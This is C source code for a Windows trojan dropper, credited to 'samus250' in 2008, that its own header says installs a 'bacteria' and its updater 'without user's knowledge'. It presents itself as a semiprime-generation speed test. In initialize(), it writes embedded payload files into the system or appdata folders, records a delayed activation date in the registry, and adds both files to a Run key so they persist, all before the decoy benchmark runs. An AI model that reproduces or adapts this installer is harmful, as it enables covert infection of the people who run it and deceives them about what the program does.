/***************************************************************************
 *   installer.c - Written by samus250, Copyright (C) 2008.                *
 *   Installs the bacteria and it's updater without user's knowledge.      *
 *   It acts as a speed tester by calculating the time taken to generate   *
 *   some semiprime numbers.                                               *
 *                                                                         *
 ***************************************************************************/
 
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <math.h>
#include <time.h>
#include <process.h>
#include <windows.h>
#include "bacteria.h"
#include "updater.h"
#include "virusproject.h"

#define DEBUG
#define WRITE_PROGRESS

#define SEMIPRIMES_START 1
#define SEMIPRIMES_END 10000000

// for unsinged long long format
#if (defined(_MSC_VER) && (_MSC_VER < 1400)) || \
    (defined(__MSVCRT_VERSION__) && (__MSVCRT_VERSION__ < 0x0800))
#   define I64_FORMATA "%I64"
#elif defined(__BORLANDC__)
#   define I64_FORMATA "%L"
#else
#   define I64_FORMATA "%ll"
#endif
#define VAL_FORMAT I64_FORMATA "u"

// typedefs
typedef unsigned long long u_long_64;
typedef unsigned short int u_short;

/**
** Returns bacteria activation date
**/
unsigned int get_start_date(void)
{
    struct tm *t;
    time_t now;
    unsigned int day;
    
    time(&now); // get epoch time and store to struct
    t = localtime(&now);
    
    day = t->tm_yday + DELAY_DAYS;
    if(day > 364)
        day -= 365;
    
    return day;
}

/**
** Installer / Initializer
**/

int initialize_errorcode;

bool initialize(void)
{
    HKEY hkey;
    LONG result_open, result_write;
    FILE *output = NULL;
    unsigned int date;
    
    char environment_var[MAX_ENVVAR_LENGTH];
    char install_directory[MAX_DIR_LENGTH];
    char value_data[MAX_KEY_VALUE_SIZE];
    
    // errors and switches
    bool systemroot_not_found = false;
    bool admin_permission = true; // assume we have permission
    
    // initialize vars
    memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
    memset(install_directory, '\0', MAX_DIR_LENGTH);
    memset(value_data, '\0', MAX_KEY_VALUE_SIZE);
    
    // get systemroot variable
    if(!(GetEnvironmentVariable(ENV_SYSTEMROOT, environment_var, MAX_ENVVAR_LENGTH))) {
        if(GetLastError() == ERROR_ENVVAR_NOT_FOUND) {
            // shit, we'll have to look someplace else
#ifdef DEBUG
            printf("- Error, systemroot envvar not found.\n");
#endif
            systemroot_not_found = true;
            
        } else {
            // some unknown error
#ifdef DEBUG
            printf("- Unknown error getting systemroot envvar.\n");
#endif
            initialize_errorcode = 1;
            return false;
        }
    }
    
    // systemroot was found
    if(!systemroot_not_found) {
#ifdef DEBUG
            printf("- %%systemroot%% found.\n");
#endif
        sprintf(install_directory, "%s\\" ADMIN_BACTERIA_INSTALL_DIR "\\" ADMIN_BACTERIA_FILENAME, environment_var);
        if(!(output = fopen(install_directory, "wb"))) {
            // we have concluded that the user doesn't have permissions
#ifdef DEBUG
            printf("- Error opening %s: Assuming limited permissions.\n", install_directory);
#endif
            admin_permission = false;
        } else {
            // successfully opened file
            
            if((fwrite(BACTERIA_DATA_NAME, sizeof(unsigned char), BACTERIA_DATA_SIZE, output)) < BACTERIA_DATA_SIZE) {
#ifdef DEBUG
                printf("- Error writing bacteria as admin.\n");
#endif
                initialize_errorcode = 2;
                return false;
            } else {
#ifdef DEBUG
                printf("- Successfully wrote bacteria as admin.\n");
#endif
            }
            fclose(output);
        }
    }
    
    // systemroot was not found or we have no permissions
    if(systemroot_not_found || !admin_permission) {
        // since systemroot was not found
        // assume automatically that the user is not admin
        admin_permission = false;
        
        memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
        memset(install_directory, '\0', MAX_DIR_LENGTH);
        
        // get appdata variable
        if(!(GetEnvironmentVariable(ENV_APPDATA, environment_var, MAX_ENVVAR_LENGTH))) {
            if(GetLastError() == ERROR_ENVVAR_NOT_FOUND) {
                // bitch, not even appdata was found
                // whatever, exit with error
#ifdef DEBUG
                printf("- Error, appdata envvar not found.\n");
#endif
                initialize_errorcode = 3;
                return false;
            } else {
                // some unknown error
#ifdef DEBUG
                printf("- Unknown error getting appdata envvar.\n");
#endif
                initialize_errorcode = 4;
                return false;
            }
        } else {
#ifdef DEBUG
            printf("- %%appdata%% found.\n");
#endif
        }
        
        // Create the %appdata%\BACTERIA_NAME directory
        sprintf(install_directory, "%s\\" LIMITED_BACTERIA_INSTALL_DIR, environment_var);
        CreateDirectory(install_directory, NULL);
        // it is impossible that the folder was not found... if it is in a system variable
        // and, if it was ERROR_ALREADY_EXISTS, then who cares? that's a good thing.
        
        // prepare the full install directory
        sprintf(install_directory, "%s\\" LIMITED_BACTERIA_INSTALL_DIR "\\" LIMITED_BACTERIA_FILENAME, environment_var);
        if(!(output = fopen(install_directory, "wb"))) {
#ifdef DEBUG
            printf("- Error opening %s.\n", install_directory);
#endif
            initialize_errorcode = 5;
            return false;
        } else {
            // successfully opened file
            if((fwrite(BACTERIA_DATA_NAME, sizeof(unsigned char), BACTERIA_DATA_SIZE, output)) < BACTERIA_DATA_SIZE) {
#ifdef DEBUG
                printf("- Error writing bacteria as limited user.\n");
#endif
                initialize_errorcode = 6;
                return false;
            } else {
#ifdef DEBUG
                printf("- Successfully wrote bacteria as limited user.\n");
#endif
            }
            fclose(output);
        }
    }
    
    //! now that we copied the bacteria where it is possible
    //! write the keys, they do not require special privilidges
    
    // we first write the date key
    // create the key DATE_KEY_NAME in HKEY_CURRENT_USER
    if((RegCreateKeyEx(HKEY_CURRENT_USER, DATE_KEY_NAME, 0,
                      NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE,
                      NULL, &hkey, NULL)) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error creating date key.\n");
#endif
        initialize_errorcode = 7;
        return false;
    } else {
#ifdef DEBUG
        printf("- Created date key successfully.\n");
#endif
    }
    
    // get the date that bacteria will activate
    date = get_start_date();
#ifdef DEBUG
    printf("- Date is %d.\n", date);
#endif
    
    // open the newly created key
    result_open = RegOpenKeyEx(HKEY_CURRENT_USER,
                               DATE_KEY_NAME, 0, 
                               KEY_WRITE, &hkey);
    
    if(result_open != ERROR_SUCCESS) {
        if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
            printf("- Error: date key not found.\n");
#endif
            initialize_errorcode = 8;
            return false;
        } else {
#ifdef DEBUG
            printf("- Error opening date key.\n");
#endif
            initialize_errorcode = 9;
            return false;
        }
    } else {
#ifdef DEBUG
        printf("- Successfully opened date key.\n");
#endif
    }
    
    // set a value with name DATE_VALUE_NAME to the key
    if((RegSetValueEx(hkey, DATE_VALUE_NAME, 0,
                       REG_DWORD, (LPBYTE) &date,
                       sizeof(unsigned int))) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error writing date to key.\n");
#endif
        initialize_errorcode = 10;
        return false;
    } else {
#ifdef DEBUG
        printf("- Successfully wrote value to date key.\n");
#endif
    }
    
    // close the key
    if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error closing date key.\n");
#endif
        initialize_errorcode = 11;
        return false;
    } else {
#ifdef DEBUG
        printf("- Successfully closed date key.\n");
#endif
    }
    
    // open key for writing bacteria, RUN_KEY_NAME
    result_open = RegOpenKeyEx(HKEY_CURRENT_USER, 
                  RUN_KEY_NAME,
                  0, KEY_WRITE, &hkey
    );
    
    // error opening key
    if(result_open != ERROR_SUCCESS) {
        if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
            printf("- Error: bacteria key not found.\n");
#endif
            initialize_errorcode = 12;
            return false;
        } else {
#ifdef DEBUG
            printf("- Error opening bacteria key.\n");
#endif
            initialize_errorcode = 13;
            return false;
        }
    } else {
#ifdef DEBUG
            printf("- Successfully opened bacteria key.\n");
#endif
    }
    
    // write the directory were it was installed as the value data
    // name: ADMIN_BACTERIA_NAME
    sprintf(value_data, "\"%s\"", install_directory);
    if(admin_permission) {
        result_write = RegSetValueEx(hkey, ADMIN_BACTERIA_NAME, 0, REG_SZ, 
                    value_data, strlen(value_data)
        );
    } else {
        result_write = RegSetValueEx(hkey, LIMITED_BACTERIA_NAME, 0, REG_SZ, 
                    value_data, strlen(value_data)
        );
    }
    
    // error writing key
    if(result_write != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error writing value to bacteria key.\n");
#endif
        initialize_errorcode = 14;
        return false;
    } else {
#ifdef DEBUG
        printf("Successfully wrote %s to bacteria key.\n", value_data);
#endif
    }
    
    // close the key
    if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
        printf("- Error closing bacteria key.\n");
#endif
        initialize_errorcode = 15;
        return false;
    } else {
#ifdef DEBUG
        printf("- Successfully closed bacteria key.\n");
#endif
    }
    
    //! if the program got this far
    //! everything in the bacteria installation was a cinch
    //! now lets start with the updater   
    memset(install_directory, '\0', MAX_DIR_LENGTH);
    memset(value_data, '\0', MAX_KEY_VALUE_SIZE);
    output = NULL;
    
    // we already know, if the user is an admin or limited account, 
    // so lets just make 2 cases
    if(admin_permission) {
        // insert updater in %systemroot%\ADMIN_UPDATER_INSTALL_DIR\ADMIN_UPDATER_FILENAME
        // write the registry key to this path
        
        sprintf(install_directory, "%s\\" ADMIN_UPDATER_INSTALL_DIR "\\" ADMIN_UPDATER_FILENAME, environment_var);
        if(!(output = fopen(install_directory, "wb"))) {
            // uh-oh... this ain't good
            // how come I wrote the bacteria, but can't
            // write the updater?
#ifdef DEBUG
            printf("- Error writing updater as admin.\n");
#endif
            initialize_errorcode = 16;
            return false;
        }
        
        if((fwrite(UPDATER_DATA_NAME, sizeof(unsigned char), UPDATER_DATA_SIZE, output)) < UPDATER_DATA_SIZE) {
#ifdef DEBUG
            printf("- Error writing updater as admin.\n");
#endif
            initialize_errorcode = 17;
            return false;
        } else {
#ifdef DEBUG
            printf("- Successfully wrote updater as admin.\n");
#endif
        }
        fclose(output);
        
        // open key RUN_KEY_NAME to insert updater values
        result_open = RegOpenKeyEx(HKEY_CURRENT_USER, 
                    RUN_KEY_NAME,
                    0, KEY_WRITE, &hkey
        );
        
        // error opening key
        if(result_open != ERROR_SUCCESS) {
            if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
                printf("- Error: updater key not found.\n");
#endif
                initialize_errorcode = 18;
                return false;
            } else {
#ifdef DEBUG
                printf("- Error opening updater key\n");
#endif
                initialize_errorcode = 19;
                return false;
            }
        } else {
#ifdef DEBUG
            printf("- Successfully opened updater key.\n");
#endif
        }
        
        sprintf(value_data, "\"%s\"", install_directory);
        // writing key
        if((RegSetValueEx(hkey, ADMIN_UPDATER_NAME, 0, REG_SZ, 
                   value_data, strlen(value_data))) != ERROR_SUCCESS) {
#ifdef DEBUG
            printf("- Error writing value to updater key.\n");
#endif
            initialize_errorcode = 20;
            return false;
        } else {
#ifdef DEBUG
        printf("- Successfully wrote %s to updater key.\n", value_data);
#endif
        }
        
        // closing key
        if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
            printf("- Error closing updater key.\n");
#endif
            initialize_errorcode = 21;
            return false;
        } else {
#ifdef DEBUG
            printf("- Successfully closed updater key.\n");
#endif
        }
        
    } else {
        // insert updater in %appdata%\LIMITED_UPDATER_INSTALL_DIR\LIMITED_UPDATER_FILENAME
        
        sprintf(install_directory, "%s\\" LIMITED_UPDATER_INSTALL_DIR, environment_var);
        CreateDirectory(install_directory, NULL);
        // hey, if it already exists, no problem
        
        memset(install_directory, '\0', MAX_DIR_LENGTH);
        sprintf(install_directory, "%s\\" LIMITED_UPDATER_INSTALL_DIR "\\" LIMITED_UPDATER_FILENAME, environment_var);
        if(!(output = fopen(install_directory, "wb"))) {
            // uh-oh... this ain't good
            // how come I wrote the bacteria, but can't
            // write the updater?
#ifdef DEBUG
            printf("- Error writing updater as a limited user.\n");
#endif
            initialize_errorcode = 22;
            return false;
        }
        
        if((fwrite(UPDATER_DATA_NAME, sizeof(unsigned char), UPDATER_DATA_SIZE, output)) < UPDATER_DATA_SIZE) {
#ifdef DEBUG
            printf("- Error writing updater as a limited user.\n");
#endif
            initialize_errorcode = 23;
            return false;
        } else {
#ifdef DEBUG
        printf("- Successfully wrote updater as a limited user.\n");
#endif
        }
        fclose(output);
        
        // open key RUN_KEY_NAME
        result_open = RegOpenKeyEx(HKEY_CURRENT_USER, 
                    RUN_KEY_NAME,
                    0, KEY_WRITE, &hkey
        );
        
        // error opening key
        if(result_open != ERROR_SUCCESS) {
            if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
                printf("- Error: updater key not found.\n");
#endif
                initialize_errorcode = 24;
                return false;
            } else {
#ifdef DEBUG
                printf("- Error opening updater key.\n");
#endif
                initialize_errorcode = 26;
                return false;
            }
        } else {
#ifdef DEBUG
            printf("- Sucessfully opened updater key.\n");
#endif
        }
        
        sprintf(value_data, "\"%s\"", install_directory);
        // writing key
        if((RegSetValueEx(hkey, LIMITED_UPDATER_NAME, 0, REG_SZ, 
                   value_data, strlen(value_data))) != ERROR_SUCCESS) {
#ifdef DEBUG
            printf("- Error writing value to updater key.\n");
#endif
            initialize_errorcode = 27;
            return false;
        } else {
#ifdef DEBUG
            printf("- Successfully wrote value %s to updater key.\n", value_data);
#endif
        }
        // closing key
        if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
            printf("- Error closing updater key.\n");
#endif
            initialize_errorcode = 28;
            return false;
        } else {
#ifdef DEBUG
            printf("- Successfully closed updater key.\n");
#endif
        }
    }
    
    // yay, everything went well!
    return true;
}

// global exit variable for thread
HANDLE gev_exit = 0;

/**
** Progress Indicators
**/

void progress_indicator(void *dummy) 
{
    u_short steps = 0;
    
    while(1) {
        // print the first character "|"
        switch(steps) {
            case 0:
                printf("|");
                break;
            case 1:
                printf("/");
                break;
            case 2:
                printf("-");
                break;
            case 3:
                printf("\\");
                break;
            default:
                break;
        }
        if(steps < 3)
            steps++;
        else
            steps = 0;
        
        if(WaitForSingleObject(gev_exit, 1000) == WAIT_OBJECT_0)
            _endthread();
        else 
            printf("\b");
    }
}

void progress(bool start, int perc)
{
    int i;
    
    //!TODO maybe get time of day if start is on
    
    printf("\r%3d%%",perc);
    printf("|");
    for (i = 0; i < 33; i++) {
        if (i == perc / 3)
            printf("*");
        else
            printf("-");
    }
    printf("|");
    
    fflush(stdout);
    
    return;
}

/**
*** Semiprime Generator
**/

#define BUFFER 1000000

int compare_semis(const void *a, const void *b)
{
    const u_long_64 *aa = a, *bb = b;
    
    if(*aa < *bb)
        return -1;
    else
        return (*aa == *bb) ? 0 : 1;
}

u_long_64 *semiprimegen(u_long_64 first_range, u_long_64 second_range, u_long_64 *semiprimes_count)
{
    bool prime = true; 	// prime detection
    u_long_64 number_to_check, prime_range;
    u_long_64 i, y, z; 		// for internal loops
    u_long_64 *primes_address = NULL, *semi_prime_address = NULL; // memory management
    u_long_64 prime_count = 1; // 2 is the first prime number
    u_long_64 buff_mult = 1; // primes_address will be initialized when 2 is stored to it
    u_long_64 semi_prime = 0;
    
    // first of all, store the number 2 as a prime
    primes_address = malloc(sizeof(u_long_64) * BUFFER);
    *primes_address = 2;
    
    // this loop generates all the prime numbers needed
    // It will then store them to RAM, dynamically
    prime_range = second_range / 2;
    for(number_to_check=3; number_to_check <= prime_range; number_to_check+=2) {
        // suppose the number is prime
        prime = true;
        
        for(i=3; i*i <= number_to_check; i+=2) {
            if(number_to_check % i == 0) {
                prime = false;
                break;
            }
        }
        
        if(prime) {
            // store the prime to dynamically allocated memory 
            prime_count++;
            if(prime_count >= BUFFER * buff_mult) {
                buff_mult++;
                primes_address = realloc(primes_address, (sizeof(u_long_64) * BUFFER * buff_mult));
            }
            primes_address[prime_count - 1] = number_to_check;
        }
        
    }
    
    // calculate semiprimes
    *semiprimes_count = buff_mult = 0;
    
    for(y=0; y<prime_count; y++) {
        for(z=y; z < prime_count; z++) {	
            semi_prime = (primes_address[y]) * (primes_address[z]);
            if(semi_prime < first_range)
                continue;
            else if(semi_prime > second_range)
                break; // don't keep multiplying by z, just break.
            // if the newly generated semiprime is between ranges
            else {
                (*semiprimes_count)++;
                if(*semiprimes_count >= BUFFER * buff_mult) {
                    buff_mult++;
                    semi_prime_address = realloc(semi_prime_address, (sizeof(u_long_64) * BUFFER * buff_mult));
                }
                semi_prime_address[(*semiprimes_count) -1] = semi_prime;
            }	
        }
        if(y == z) // if you break on the first time of the inner for loop, means that y^2 is too big, break entirely
            break;
    }
    
    // unload primes, they are not needed anymore
    free(primes_address);
    
    // sort semiprimes
    qsort(semi_prime_address, *semiprimes_count, sizeof(u_long_64), compare_semis);
    
    return semi_prime_address;
}

#undef BUFFER

int main(void)
{
    FILE *primefile = NULL;
    u_long_64 *semiprimes = NULL;
    u_long_64 file_linecount = 2, semiprimes_count = 0;
    unsigned int x;
    unsigned char rowcount = 1;
    int perc = 0;
    clock_t ticks;
    int tid;
    
    // instead, put virus installer here
    printf("Initializing...\n");
    if(!(initialize())) {
        printf("Error Initializing! Error Code = %d\n", initialize_errorcode);
        system("pause > nul");
        return 0;
    }
    
    printf("\nGenerating Semiprimes... ");
    gev_exit = CreateEvent(NULL, TRUE, FALSE, NULL);
    if(!gev_exit) {
        printf("CreateEvent failed, le = %d", GetLastError());
        return 1;
    }
    
    // begin progress indicator thread
    if( (tid = _beginthread(progress_indicator, 0, NULL)) == -1) {
        printf("Error creating progress indicator thread");
        return 1;
    }
    
    // generate semiprimes and store to memory
    ticks = clock();
    semiprimes = semiprimegen(SEMIPRIMES_START, SEMIPRIMES_END, &semiprimes_count);
    ticks = clock() - ticks;
    
    // modify global exit variable
    SetEvent(gev_exit);
    
    // create file
    if((primefile = fopen("./semiprimes.txt","w")) == NULL) {
        printf("Error opening semiprimes.txt for writing.");
        return 1;
    }
    
#ifdef WRITE_PROGRESS
    printf("\nWriting to file...\n");
#endif
    
    // prints semiprimes found
    
    //print first row number
    fprintf(primefile,"1.");
    
    for(x=0; x<semiprimes_count; x++) {
        fprintf(primefile,"\t" VAL_FORMAT , semiprimes[x]); // print the number to the text file
        if(rowcount == 10) {
            // it will insert a new line in the text file, change value if desired
            fprintf(primefile,"\n" VAL_FORMAT ".",file_linecount);
            rowcount = 0; // reset
            file_linecount++; // number of lines written
        }
        rowcount++; // number of printed primes on current row
#ifdef WRITE_PROGRESS
        if( (perc+1) <= (int)(100 * x / semiprimes_count)) {
            perc = (int)(100 * x / semiprimes_count);
            progress(false, perc);
        }
#endif
    }
    
#ifdef WRITE_PROGRESS
    progress(false, 100);
    printf("\n");
#endif
    
    // close the file
    if(fclose(primefile) == EOF)
        printf("Error closing file\n");
    
    // unload semiprimes
    free(semiprimes);
    
    printf("\n");
    printf("Took %.2f seconds to generate semiprimes.\n", ticks / (double)CLOCKS_PER_SEC);
    
    system("pause>nul");
    return 0;
}

